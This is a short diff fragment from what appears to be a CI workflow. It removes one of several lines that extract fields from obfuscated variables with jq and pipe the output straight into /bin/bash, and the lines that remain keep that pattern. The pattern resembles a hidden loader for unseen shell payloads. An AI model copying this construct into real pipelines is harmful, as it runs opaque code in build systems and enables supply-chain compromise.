@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$d894" | jq -r .gst6 | /bin/bash
           echo $lcceh30 | jq -r .kw0 | /bin/bash
           echo $z01 | jq -r .vvbvc9053 | /bin/bash
-          echo $qbwe6 | jq -r .rqc9531 | /bin/bash
           echo $dxoh580 | jq -r .w8040 | /bin/bash
           echo $w895 | jq -r .o8 | /bin/bash
 
